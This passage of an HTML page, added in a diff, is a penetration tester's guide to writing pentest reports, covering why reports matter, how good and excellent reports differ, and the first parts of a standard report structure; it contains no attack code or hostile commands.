@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Report Writing &amp; Post-Testing Actions | Nisarg Chasmawala</title>
+<meta name="description" content="Penetration Testing Report Writing and Post-Testing Actions — a complete field guide by Nisarg Chasmawala (Shroff), Offensive Security Engineer.">
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --g:#00ff41;--c:#00e5ff;--p:#bf00ff;--r:#ff003c;--o:#ffd700;
+  --bg:#030509;--t1:#d4ffe0;--t2:#7aad82;--t3:#2e4a32;
+  --mono:'Share Tech Mono',monospace;--dsp:'Orbitron',sans-serif;--body:'Rajdhani',sans-serif;
+  --glow:0 0 20px rgba(0,255,65,.4),0 0 60px rgba(0,255,65,.15);
+  --cglow:0 0 20px rgba(0,229,255,.4),0 0 60px rgba(0,229,255,.1);
+  --pglow:0 0 20px rgba(191,0,255,.4),0 0 60px rgba(191,0,255,.1);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;overflow-x:hidden}
+body{background:var(--bg);color:var(--t1);font-family:var(--body);font-size:17px;line-height:1.8;overflow-x:hidden;cursor:none}
+#bg-particle{position:fixed;inset:0;z-index:0;pointer-events:none}
+#bg-hex{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.35}
+#bg-scan{position:fixed;inset:0;z-index:9999;pointer-events:none;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,.009) 2px,rgba(0,255,65,.009) 4px)}
+#bg-vignette{position:fixed;inset:0;z-index:1;pointer-events:none;background:radial-gradient(ellipse at 50% 50%,transparent 50%,rgba(3,5,9,.85) 100%)}
+#bg-noise{position:fixed;inset:0;z-index:2;pointer-events:none;opacity:.04;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");background-size:200px 200px;animation:grain .4s steps(1) infinite}
+@keyframes grain{0%{transform:translate(0,0)}10%{transform:translate(-2%,-2%)}20%{transform:translate(2%,2%)}30%{transform:translate(-1%,1%)}40%{transform:translate(1%,-1%)}50%{transform:translate(-3%,1%)}60%{transform:translate(1%,3%)}70%{transform:translate(-1%,-2%)}80%{transform:translate(2%,1%)}90%{transform:translate(-2%,2%)}}
+#cur{position:fixed;width:10px;height:10px;border-radius:50%;background:var(--g);box-shadow:var(--glow);pointer-events:none;z-index:99999;transform:translate(-50%,-50%);transition:width .1s,height .1s}
+#cur2{position:fixed;width:30px;height:30px;border-radius:50%;border:1px solid rgba(0,255,65,.5);pointer-events:none;z-index:99998;transform:translate(-50%,-50%);transition:left .08s,top .08s}
+#cur3{position:fixed;width:50px;height:50px;border-radius:50%;border:1px solid rgba(0,255,65,.2);pointer-events:none;z-index:99997;transform:translate(-50%,-50%);transition:left .15s,top .15s}
+#prog{position:fixed;top:0;left:0;height:2px;background:linear-gradient(to right,var(--g),var(--c),var(--p));box-shadow:0 0 10px var(--g);z-index:10000;width:0%}
+.topbar{position:fixed;top:0;left:0;right:0;height:58px;background:rgba(3,5,9,.88);border-bottom:1px solid rgba(0,255,65,.12);backdrop-filter:blur(20px) saturate(1.5);z-index:1000;display:flex;align-items:center;justify-content:space-between;padding:0 32px}
+.tb-left{display:flex;flex-direction:column;gap:2px}
+.tb-name{font-family:var(--dsp);font-size:13px;font-weight:900;color:var(--t1);letter-spacing:3px}
+.tb-roles{font-family:var(--mono);font-size:9px;letter-spacing:1.5px;overflow:hidden;white-space:nowrap}
+.tb-inner{display:inline-block;color:var(--c);animation:ticker 18s linear infinite}
+@keyframes ticker{0%{transform:translateX(100%)}100%{transform:translateX(-100%)}}
+.tb-status{display:flex;align-items:center;gap:8px;font-family:var(--mono);font-size:11px;color:var(--g)}
+.tb-dot{width:7px;height:7px;border-radius:50%;background:var(--g);box-shadow:0 0 10px var(--g);animation:tdot 1.2s ease-in-out infinite}
+@keyframes tdot{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.3;transform:scale(.7)}}
+.toc{position:fixed;right:20px;top:50%;transform:translateY(-50%);z-index:200;display:flex;flex-direction:column;gap:9px}
+.toc-i{display:flex;align-items:center;gap:8px;cursor:pointer}
+.toc-d{width:6px;height:6px;border-radius:50%;border:1px solid var(--t3);transition:all .25s;flex-shrink:0}
+.toc-i.active .toc-d,.toc-i:hover .toc-d{background:var(--g);border-color:var(--g);box-shadow:0 0 10px var(--g)}
+.toc-l{font-family:var(--mono);font-size:10px;color:var(--t3);opacity:0;transform:translateX(6px);transition:all .2s;white-space:nowrap}
+.toc-i:hover .toc-l,.toc-i.active .toc-l{opacity:1;transform:none;color:var(--g)}
+@media(max-width:1000px){.toc{display:none}}
+.wrap{position:relative;z-index:10;max-width:980px;margin:0 auto;padding:0 28px}
+.hero{min-height:100vh;display:flex;flex-direction:column;justify-content:center;padding:100px 0 60px;position:relative}
+.hero-canvas-wrap{position:absolute;right:-80px;top:50%;transform:translateY(-52%);width:500px;height:500px;pointer-events:none}
+#hero-geo{width:100%;height:100%}
+.hero-tag{font-family:var(--mono);font-size:11px;letter-spacing:4px;color:var(--c);text-transform:uppercase;margin-bottom:18px;opacity:0;animation:fup .6s ease forwards .3s;display:flex;align-items:center;gap:12px}
+.hero-tag::before{content:'';width:40px;height:1px;background:linear-gradient(to right,transparent,var(--c))}
+.hero-tag::after{content:'';flex:1;max-width:100px;height:1px;background:linear-gradient(to right,var(--c),transparent)}
+.hero-title{font-family:var(--dsp);font-size:clamp(18px,3.5vw,44px);font-weight:900;line-height:1.0;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;opacity:0;animation:fup .7s ease forwards .5s}
+.ht-line1{display:block;color:var(--g);text-shadow:0 0 40px rgba(0,255,65,.6),0 0 100px rgba(0,255,65,.25)}
+.ht-sub{display:block;font-size:.43em;letter-spacing:5px;color:rgba(200,255,220,.5);font-weight:400;margin-top:10px}
+.gw{position:relative;display:inline-block}
+.gw::before,.gw::after{content:attr(data-t);position:absolute;top:0;left:0;width:100%;font-family:var(--dsp);font-weight:900;font-size:inherit;letter-spacing:inherit;text-transform:uppercase}
+.gw::before{color:var(--c);animation:ga 5s infinite;clip-path:polygon(0 0,100% 0,100% 33%,0 33%)}
+.gw::after{color:var(--r);animation:gb 5s infinite;clip-path:polygon(0 66%,100% 66%,100% 100%,0 100%)}
+@keyframes ga{0%,85%,100%{transform:none;opacity:0}87%{transform:translate(-5px,2px);opacity:.9}93%{transform:none;opacity:0}}
+@keyframes gb{0%,87%,100%{transform:none;opacity:0}89%{transform:translate(5px,3px);opacity:.8}95%{transform:none;opacity:0}}
+.hero-desc{font-size:17px;font-weight:300;color:var(--t2);max-width:560px;line-height:1.75;margin-bottom:36px;opacity:0;animation:fup .8s ease forwards .8s;margin-top:20px}
+.hero-meta{display:flex;gap:24px;flex-wrap:wrap;opacity:0;animation:fup .8s ease forwards 1s}
+.m-item{display:flex;flex-direction:column;gap:3px}
+.m-lbl{font-family:var(--mono);font-size:9px;letter-spacing:3px;color:var(--t3);text-transform:uppercase}
+.m-val{font-family:var(--mono);font-size:12px;color:var(--c)}
+.hero-scroll-hint{position:absolute;bottom:24px;left:0;display:flex;align-items:center;gap:12px;opacity:0;animation:fin 1s ease forwards 1.8s}
+.hs-line{width:60px;height:1px;background:linear-gradient(to right,var(--g),transparent)}
+.hs-txt{font-family:var(--mono);font-size:9px;letter-spacing:3px;color:var(--t3)}
+.hs-pulse{width:6px;height:6px;border-radius:50%;background:var(--g);box-shadow:0 0 8px var(--g);animation:tdot 1.5s ease-in-out infinite}
+.sec{margin-bottom:100px}
+.sec-hd{display:flex;align-items:center;gap:14px;margin-bottom:40px}
+.sec-n{font-family:var(--mono);font-size:10px;color:var(--p);letter-spacing:2px;min-width:44px}
+.sec-ln{flex:1;height:1px;background:linear-gradient(to right,rgba(0,229,255,.35),transparent)}
+.sec-t{font-family:var(--dsp);font-size:clamp(14px,2.4vw,21px);font-weight:700;letter-spacing:3px;text-transform:uppercase;color:var(--c);text-shadow:var(--cglow)}
+.tw-cursor{display:inline-block;width:2px;height:1em;background:var(--c);margin-left:4px;animation:blink 1s step-end infinite;vertical-align:middle}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+.sec-ai .sec-t{color:#bf00ff;text-shadow:var(--pglow)}
+.sec-ai .sec-n{color:var(--c)}
+.sec-ai .sec-ln{background:linear-gradient(to right,rgba(191,0,255,.35),transparent)}
+.sec-ai .tw-cursor{background:#bf00ff}
+.panel{background:rgba(0,255,65,.025);border:1px solid rgba(0,255,65,.12);border-radius:4px;padding:32px;margin-bottom:22px;position:relative;overflow:hidden;transition:border-color .3s,box-shadow .3s,transform .3s}
+.panel::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:linear-gradient(to bottom,var(--g),transparent);opacity:0;transition:opacity .3s}
+.panel::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,.015) 0%,transparent 60%);pointer-events:none}
+.panel:hover{border-color:rgba(0,229,255,.4);box-shadow:0 0 50px rgba(0,229,255,.07),0 20px 60px rgba(0,0,0,.3);transform:translateY(-3px)}
+.panel:hover::before{opacity:1}
+.panel p{color:var(--t2);margin-bottom:12px}
+.panel p:last-child{margin-bottom:0}
+.panel-t{font-family:var(--dsp);font-size:12px;font-weight:700;letter-spacing:3px;color:var(--g);text-transform:uppercase;margin-bottom:18px;display:flex;align-items:center;gap:12px}
+.panel-t::after{content:'';flex:1;height:1px;background:linear-gradient(to right,rgba(0,255,65,.2),transparent)}
+.panel-ai{background:rgba(191,0,255,.03);border-color:rgba(191,0,255,.18)}
+.panel-ai:hover{border-color:rgba(191,0,255,.45)}
+.panel-ai .panel-t{color:#bf00ff}
+.panel-ai .panel-t::after{background:linear-gradient(to right,rgba(191,0,255,.2),transparent)}
+.panel-ai::before{background:linear-gradient(to bottom,#bf00ff,transparent)}
+/* SECTION CARDS */
+.vgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(275px,1fr));gap:18px;margin-bottom:28px;perspective:1200px}
+.vc{background:rgba(0,229,255,.03);border:1px solid rgba(0,229,255,.15);border-radius:4px;padding:24px;position:relative;overflow:hidden;cursor:default;transform-style:preserve-3d;transition:box-shadow .25s;will-change:transform}
+.vc::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(0,229,255,.04) 0%,transparent 50%);opacity:0;transition:opacity .25s}
+.vc::after{content:'';position:absolute;top:0;right:0;width:0;height:0;border-top:32px solid rgba(0,229,255,.2);border-left:32px solid transparent}
+.vc:hover::before{opacity:1}
+.vcn{font-family:var(--mono);font-size:44px;color:rgba(0,229,255,.08);position:absolute;top:6px;right:12px;line-height:1}
+.vcname{font-family:var(--dsp);font-size:11px;font-weight:700;letter-spacing:2px;color:var(--c);text-transform:uppercase;margin-bottom:10px}
+.vcdesc{font-size:14px;color:var(--t2);line-height:1.65;font-weight:300}
+/* SEVERITY CARDS */
+.sgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:14px;margin:20px 0}
+.scard{border-radius:4px;padding:20px;position:relative;overflow:hidden;transition:all .25s;cursor:default}
+.scard::after{content:'';position:absolute;top:0;right:0;width:0;height:0}
+.scard:hover{transform:translateY(-3px)}
+.sc-crit{background:rgba(255,0,60,.04);border:1px solid rgba(255,0,60,.25);border-left:4px solid var(--r)}
+.sc-crit:hover{box-shadow:0 0 30px rgba(255,0,60,.1),0 12px 40px rgba(0,0,0,.2)}
+.sc-high{background:rgba(255,148,0,.03);border:1px solid rgba(255,148,0,.2);border-left:4px solid #ff9400}
+.sc-high:hover{box-shadow:0 0 30px rgba(255,148,0,.08),0 12px 40px rgba(0,0,0,.2)}
+.sc-med{background:rgba(255,215,0,.03);border:1px solid rgba(255,215,0,.18);border-left:4px solid var(--o)}
+.sc-med:hover{box-shadow:0 0 30px rgba(255,215,0,.07),0 12px 40px rgba(0,0,0,.2)}
+.sc-low{background:rgba(0,229,255,.03);border:1px solid rgba(0,229,255,.15);border-left:4px solid var(--c)}
+.sc-low:hover{box-shadow:0 0 30px rgba(0,229,255,.07),0 12px 40px rgba(0,0,0,.2)}
+.sc-info{background:rgba(0,255,65,.02);border:1px solid rgba(0,255,65,.12);border-left:4px solid var(--g)}
+.sc-info:hover{box-shadow:0 0 30px rgba(0,255,65,.05),0 12px 40px rgba(0,0,0,.2)}
+.sc-label{font-family:var(--dsp);font-size:11px;font-weight:700;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px}
+.sc-crit .sc-label{color:var(--r)}.sc-high .sc-label{color:#ff9400}
+.sc-med .sc-label{color:var(--o)}.sc-low .sc-label{color:var(--c)}.sc-info .sc-label{color:var(--g)}
+.sc-cvss{font-family:var(--mono);font-size:22px;font-weight:700;margin-bottom:6px}
+.sc-crit .sc-cvss{color:var(--r)}.sc-high .sc-cvss{color:#ff9400}
+.sc-med .sc-cvss{color:var(--o)}.sc-low .sc-cvss{color:var(--c)}.sc-info .sc-cvss{color:var(--g)}
+.sc-desc{font-size:13px;color:var(--t3);line-height:1.5}
+/* AI CARDS */
+.ai-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(270px,1fr));gap:16px;margin:20px 0}
+.ai-card{background:rgba(191,0,255,.04);border:1px solid rgba(191,0,255,.18);border-radius:4px;padding:22px;position:relative;overflow:hidden;transition:all .3s}
+.ai-card::after{content:'';position:absolute;top:0;right:0;width:0;height:0;border-top:26px solid rgba(191,0,255,.25);border-left:26px solid transparent}
+.ai-card:hover{border-color:rgba(191,0,255,.5);box-shadow:var(--pglow),0 16px 40px rgba(0,0,0,.25);transform:translateY(-3px)}
+.ai-ico{font-size:24px;margin-bottom:10px;display:block}
+.ai-name{font-family:var(--dsp);font-size:11px;font-weight:700;letter-spacing:2px;color:#bf00ff;text-transform:uppercase;margin-bottom:10px}
+.ai-desc{font-size:14px;color:var(--t2);line-height:1.65;font-weight:300}
+/* TOOL CARDS */
+.tgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:14px;margin:20px 0}
+.tc{background:rgba(0,229,255,.03);border:1px solid rgba(0,229,255,.1);border-radius:4px;padding:20px;transition:all .25s;position:relative;overflow:hidden}
+.tc::after{content:'';position:absolute;bottom:0;left:0;right:0;height:2px;background:linear-gradient(to right,var(--c),transparent);transform:scaleX(0);transform-origin:left;transition:transform .3s}
+.tc:hover{border-color:rgba(0,229,255,.4);background:rgba(0,229,255,.06);box-shadow:var(--cglow),0 12px 40px rgba(0,0,0,.2);transform:translateY(-3px)}
+.tc:hover::after{transform:scaleX(1)}
+.tcname{font-family:var(--mono);font-size:12px;color:var(--c);margin-bottom:5px}
+.tctag{font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--o);text-transform:uppercase;margin-bottom:8px;display:block}
+.tcdesc{font-size:13px;color:var(--t3);line-height:1.5}
+/* ALERTS */
+.alert{border-radius:4px;padding:16px 20px;margin:20px 0;display:flex;gap:14px;align-items:flex-start}
+.al-i{background:rgba(0,229,255,.04);border:1px solid rgba(0,229,255,.14);border-left:3px solid var(--c)}
+.al-w{background:rgba(255,215,0,.04);border:1px solid rgba(255,215,0,.18);border-left:3px solid var(--o)}
+.al-p{background:rgba(191,0,255,.04);border:1px solid rgba(191,0,255,.18);border-left:3px solid #bf00ff}
+.al-ic{font-family:var(--mono);font-size:13px;flex-shrink:0;margin-top:2px}
+.al-i .al-ic{color:var(--c)}.al-w .al-ic{color:var(--o)}.al-p .al-ic{color:#bf00ff}
+.al-tx{font-size:14px;color:var(--t2);line-height:1.6}
+/* CHECKLIST */
+.chk{list-style:none}
+.chk li{display:flex;align-items:flex-start;gap:12px;padding:11px 0;border-bottom:1px solid rgba(0,255,65,.05);font-size:14px;color:var(--t2);line-height:1.6}
+.chk li:last-child{border-bottom:none}
+.chk-i{flex-shrink:0;width:18px;height:18px;border:1px solid var(--g);border-radius:2px;display:flex;align-items:center;justify-content:center;margin-top:2px;background:rgba(0,255,65,.05)}
+.chk-i::after{content:'✓';font-size:10px;color:var(--g);font-family:var(--mono)}
+.chk li strong{color:var(--t1);font-weight:600}
+/* TABLE */
+.ptbl{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:12px;margin:16px 0}
+.ptbl th{text-align:left;padding:11px 14px;color:var(--c);border-bottom:1px solid rgba(0,229,255,.3);letter-spacing:2px;font-size:10px;text-transform:uppercase}
+.ptbl td{padding:10px 14px;color:var(--t2);border-bottom:1px solid rgba(0,255,65,.05);vertical-align:top}
+.ptbl tr:hover td{background:rgba(0,255,65,.02)}
+.ptbl td:first-child{color:var(--g);font-weight:700}
+/* MGRID */
+.mgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(255px,1fr));gap:16px;margin:20px 0}
+.mcard{background:rgba(0,229,255,.03);border:1px solid rgba(0,229,255,.12);border-radius:4px;padding:22px;transition:all .25s;position:relative;overflow:hidden}
+.mcard::after{content:'';position:absolute;top:0;right:0;width:0;height:0;border-top:26px solid rgba(0,229,255,.2);border-left:26px solid transparent}
+.mcard:hover{border-color:rgba(0,229,255,.4);box-shadow:var(--cglow),0 16px 40px rgba(0,0,0,.2);transform:translateY(-3px)}
+.mcard-name{font-family:var(--dsp);font-size:11px;font-weight:700;letter-spacing:2px;color:var(--c);text-transform:uppercase;margin-bottom:10px}
+.mcard-desc{font-size:14px;color:var(--t2);line-height:1.65;font-weight:300}
+/* 3-COL */
+.dgrid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;margin-bottom:22px}
+@media(max-width:740px){.dgrid{grid-template-columns:1fr}}
+/* CODE */
+.cb{background:rgba(0,0,0,.7);border:1px solid rgba(0,255,65,.1);border-left:3px solid var(--g);border-radius:0 4px 4px 0;padding:22px 26px;margin:16px 0;position:relative;overflow-x:auto;transition:all .3s;cursor:pointer}
+.cb::before{content:attr(data-l);position:absolute;top:0;right:0;font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--g);background:rgba(0,255,65,.07);padding:3px 12px;border-bottom-left-radius:4px;text-transform:uppercase}
+.cb::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;background:linear-gradient(to right,var(--g),transparent);opacity:0;transition:opacity .3s}
+.cb:hover{border-color:rgba(0,255,65,.35)}
+.cb:hover::after{opacity:.5}
+.cb.cb-ai{border-left-color:#bf00ff}
+.cb.cb-ai::before{color:#bf00ff;background:rgba(191,0,255,.07)}
+.cb code{font-family:var(--mono);font-size:13px;color:var(--g);white-space:pre;display:block;line-height:1.9}
+.cmd{color:var(--c)}.flag{color:var(--o)}.cmt{color:var(--t3)}.str{color:#ff79c6}.prm{color:#bd93f9}.kw{color:var(--r)}.fn{color:#8be9fd}
+/* CTA */
+.cta{background:linear-gradient(135deg,rgba(0,255,65,.04),rgba(191,0,255,.04));border:1px solid rgba(0,229,255,.3);border-radius:4px;padding:60px 50px;text-align:center;position:relative;overflow:hidden;margin-top:80px}
+.cta::before{content:'REPORT';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-family:var(--dsp);font-size:140px;font-weight:900;color:rgba(0,255,65,.018);pointer-events:none;letter-spacing:16px}
+.cta-t{font-family:var(--dsp);font-size:20px;font-weight:700;letter-spacing:4px;color:var(--g);text-transform:uppercase;margin-bottom:16px;text-shadow:var(--glow)}
+.cta-p{color:var(--t2);font-size:16px;max-width:540px;margin:0 auto 32px;line-height:1.75}
+.cta-btns{display:flex;gap:16px;justify-content:center;flex-wrap:wrap}
+.btn{font-family:var(--mono);font-size:11px;letter-spacing:3px;text-transform:uppercase;padding:13px 30px;border-radius:2px;text-decoration:none;display:inline-block;transition:all .25s}
+.btn-p{border:1px solid var(--g);color:var(--g);background:rgba(0,255,65,.06)}
+.btn-p:hover{background:var(--g);color:var(--bg);box-shadow:var(--glow)}
+.btn-s{border:1px solid var(--c);color:var(--c);background:rgba(0,229,255,.05)}
+.btn-s:hover{background:var(--c);color:var(--bg);box-shadow:var(--cglow)}
+.footer{border-top:1px solid rgba(0,255,65,.1);padding:32px 0;margin-top:60px;display:flex;align-items:flex-start;justify-content:space-between;flex-wrap:wrap;gap:20px}
+.f-l{font-family:var(--mono);font-size:11px;color:var(--t3);letter-spacing:1.5px;line-height:2}
+.f-alias{color:var(--g);font-size:10px;letter-spacing:3px;text-shadow:0 0 8px var(--g)}
+.f-r{font-family:var(--mono);font-size:11px;color:var(--t3);text-align:right;line-height:2}
+.f-r a{color:var(--g);text-decoration:none}
+.f-r a:hover{text-shadow:var(--glow)}
+.div{height:1px;background:linear-gradient(to right,transparent,rgba(0,255,65,.15),transparent);margin:60px 0;position:relative}
+.div::after{content:'';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:6px;height:6px;border-radius:50%;background:var(--g);box-shadow:0 0 12px var(--g)}
+.div-ai{background:linear-gradient(to right,transparent,rgba(191,0,255,.22),transparent)}
+.div-ai::after{background:#bf00ff;box-shadow:0 0 12px #bf00ff}
+@keyframes fup{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:none}}
+@keyframes fin{from{opacity:0}to{opacity:1}}
+.rv{opacity:0;transform:translateY(30px);transition:opacity .8s,transform .8s}
+.rv-l{opacity:0;transform:translateX(-30px);transition:opacity .8s,transform .8s}
+.rv.on,.rv-l.on{opacity:1;transform:none}
+@media(max-width:700px){.vgrid,.tgrid,.mgrid,.sgrid,.ai-grid,.dgrid{grid-template-columns:1fr}.hero-canvas-wrap{display:none}.cta{padding:36px 20px}.cta::before{font-size:70px}}
+</style>
+</head>
+<body>
+<canvas id="bg-particle"></canvas>
+<canvas id="bg-hex"></canvas>
+<div id="bg-vignette"></div>
+<div id="bg-noise"></div>
+<div id="bg-scan"></div>
+<div id="cur"></div><div id="cur2"></div><div id="cur3"></div>
+<div id="prog"></div>
+
+<nav class="topbar">
+  <div class="tb-left">
+    <span class="tb-name">NISARG CHASMAWALA (SHROFF)</span>
+    <div class="tb-roles"><span class="tb-inner">Penetration Tester &nbsp;|&nbsp; Vulnerability Assessment &nbsp;|&nbsp; Cybersecurity Researcher &nbsp;|&nbsp; Offensive Security Engineer &nbsp;|&nbsp; Digital Forensics &nbsp;|&nbsp; Penetration Tester &nbsp;|&nbsp; Vulnerability Assessment &nbsp;|&nbsp; Cybersecurity Researcher &nbsp;|&nbsp; Offensive Security Engineer &nbsp;|&nbsp; Digital Forensics</span></div>
+  </div>
+  <div class="tb-status"><span class="tb-dot"></span>SYS ONLINE</div>
+</nav>
+
+<nav class="toc" id="toc">
+  <div class="toc-i active" onclick="goTo('#hero')" data-s="hero"><div class="toc-d"></div><span class="toc-l">INTRO</span></div>
+  <div class="toc-i" onclick="goTo('#why')" data-s="why"><div class="toc-d"></div><span class="toc-l">WHY REPORTS MATTER</span></div>
+  <div class="toc-i" onclick="goTo('#structure')" data-s="structure"><div class="toc-d"></div><span class="toc-l">REPORT STRUCTURE</span></div>
+  <div class="toc-i" onclick="goTo('#findings')" data-s="findings"><div class="toc-d"></div><span class="toc-l">WRITING FINDINGS</span></div>
+  <div class="toc-i" onclick="goTo('#severity')" data-s="severity"><div class="toc-d"></div><span class="toc-l">SEVERITY RATINGS</span></div>
+  <div class="toc-i" onclick="goTo('#post')" data-s="post"><div class="toc-d"></div><span class="toc-l">POST-TESTING ACTIONS</span></div>
+  <div class="toc-i" onclick="goTo('#tools')" data-s="tools"><div class="toc-d"></div><span class="toc-l">TOOLS</span></div>
+  <div class="toc-i" onclick="goTo('#ai')" data-s="ai"><div class="toc-d"></div><span class="toc-l">AI INTEGRATION</span></div>
+  <div class="toc-i" onclick="goTo('#best')" data-s="best"><div class="toc-d"></div><span class="toc-l">BEST PRACTICES</span></div>
+</nav>
+
+<div class="wrap">
+
+<!-- HERO -->
+<section class="hero" id="hero">
+  <div class="hero-canvas-wrap"><canvas id="hero-geo"></canvas></div>
+  <div class="hero-tag">NISARG CHASMAWALA &nbsp;//&nbsp; ALIAS: HEAVEN</div>
+  <h1 class="hero-title">
+    <div class="gw" data-t="PENTEST REPORT">
+      <span class="ht-line1">PENTEST REPORT</span>
+    </div>
+    <span class="ht-sub">WRITING + POST-TESTING ACTIONS + AI INTEGRATION</span>
+  </h1>
+  <p class="hero-desc">The definitive guide to penetration test report writing and post-testing actions — from structuring the executive summary and writing evidence-backed findings through severity rating methodology, remediation guidance, retesting, and how Artificial Intelligence is transforming report generation and post-engagement workflows.</p>
+  <div class="hero-meta">
+    <div class="m-item"><span class="m-lbl">Author</span><span class="m-val">Nisarg Chasmawala (Shroff)</span></div>
+    <div class="m-item"><span class="m-lbl">Alias</span><span class="m-val">HEAVEN</span></div>
+    <div class="m-item"><span class="m-lbl">Category</span><span class="m-val">Reporting · CVSS · Post-Testing · AI</span></div>
+    <div class="m-item"><span class="m-lbl">Frameworks</span><span class="m-val">PTES · OWASP · CVSSv3.1</span></div>
+  </div>
+  <div class="hero-scroll-hint"><div class="hs-line"></div><span class="hs-txt">SCROLL TO BEGIN</span><div class="hs-pulse"></div></div>
+</section>
+
+<div class="div"></div>
+
+<!-- 01 WHY REPORTS MATTER -->
+<section class="sec rv" id="why">
+  <div class="sec-hd"><span class="sec-n">01 //</span><h2 class="sec-t">Why Report Writing Defines the Engagement<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+
+  <div class="panel rv-l">
+    <p>A penetration test is only as valuable as the report that communicates its findings. The most technically sophisticated engagement — weeks of deep reconnaissance, multiple chains of privilege escalation, domain compromise — produces zero business value if the resulting report is unclear, poorly structured, or fails to connect technical findings to business risk. The report is the primary deliverable; everything else is preparation for it.</p>
+    <p>The report serves four distinct functions simultaneously: it is a <strong style="color:var(--t1)">vulnerability register</strong> documenting every security weakness found; a <strong style="color:var(--t1)">remediation guide</strong> telling engineers exactly what to fix and how; a <strong style="color:var(--t1)">compliance artefact</strong> providing audit evidence of due-diligence security testing; and a <strong style="color:var(--t1)">business risk communication</strong> translating technical findings into operational and financial impact that executives can act on. A report that fails any of these functions fails the engagement.</p>
+  </div>
+
+  <div class="alert al-i rv">
+    <span class="al-ic">[ i ]</span>
+    <p class="al-tx">Industry data consistently shows that <strong>40–60% of penetration test findings are never remediated</strong> after delivery. The primary cause is not lack of priority — it is unclear, non-actionable remediation guidance. A finding that says "patch this vulnerability" fails; one that says "upgrade OpenSSL from 1.0.1e to 3.x and disable TLS 1.0/1.1 in the configuration at /etc/ssl/openssl.cnf" succeeds. Report quality directly determines whether findings get fixed.</p>
+  </div>
+
+  <div class="panel rv">
+    <div class="panel-t">What Separates Good Reports from Great Reports</div>
+    <table class="ptbl">
+      <thead><tr><th>Attribute</th><th>Adequate Report</th><th>Excellent Report</th></tr></thead>
+      <tbody>
+        <tr><td>Executive Summary</td><td>Lists vulnerabilities found</td><td>Quantifies business risk — downtime cost, data exposure scope, regulatory consequence</td></tr>
+        <tr><td>Finding Descriptions</td><td>Explains what the vulnerability is</td><td>Explains what it is, why it exists, what an attacker can do with it, and how to verify it's fixed</td></tr>
+        <tr><td>Remediation Guidance</td><td>"Apply the latest patch"</td><td>Specific version, configuration file, code change, and verification test command</td></tr>
+        <tr><td>Evidence</td><td>Screenshots of tool output</td><td>Annotated screenshots showing the specific vulnerable element and the impact demonstrated</td></tr>
+        <tr><td>Audience Separation</td><td>One document for everyone</td><td>Executive summary for leadership; technical findings for engineers; remediation appendix for ops</td></tr>
+        <tr><td>Reproducibility</td><td>Finding description only</td><td>Step-by-step reproduction instructions allowing the client to independently verify the finding</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- 02 REPORT STRUCTURE -->
+<section class="sec rv" id="structure">
+  <div class="sec-hd"><span class="sec-n">02 //</span><h2 class="sec-t">Penetration Test Report Structure<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+
+  <div class="panel rv-l">
+    <p>A professional penetration test report follows a consistent structure that serves both technical and non-technical audiences. The structure below represents industry best practice aligned with PTES, OWASP Testing Guide, and CREST reporting standards. Each section has a specific purpose and audience — understanding this allows the report author to calibrate the language, depth, and format of each section appropriately rather than writing one undifferentiated technical monologue.</p>
+  </div>
+
+  <div class="vgrid rv">
+    <div class="vc"><span class="vcn">01</span><div class="vcname">Executive Summary</div><div class="vcdesc">One to two pages maximum. Written for the CISO, CTO, or board — zero technical jargon. Covers: overall security posture assessment, top 3–5 risks with business impact statements (not CVSSv3 scores), compliance implications, and the recommended investment priorities. This is the section that gets read in the board meeting. It must stand alone from the rest of the report.</div></div>
+    <div class="vc"><span class="vcn">02</span><div class="vcname">Scope &amp; Methodology</div><div class="vcdesc">Documents what was tested, when, by whom, and how. Includes: all in-scope IP ranges, domains, and applications; testing type (black/grey/white box); dates and hours of testing; testing limitations and exclusions; and the frameworks applied (PTES, OWASP, NIST). Provides the audit trail and reproducibility context. Required for PCI-DSS, ISO 27001, and SOC 2 compliance evidence.</div></div>
+    <div class="vc"><span class="vcn">03</span><div class="vcname">Findings Summary</div><div class="vcdesc">A visual risk matrix showing the count and distribution of findings by severity (Critical / High / Medium / Low / Informational). Often presented as a bar chart or heat map. Provides instant visual comprehension of the overall risk distribution — a page that can be extracted and placed in the executive pack without the full technical detail. Updated at each reassessment to show remediation progress.</div></div>
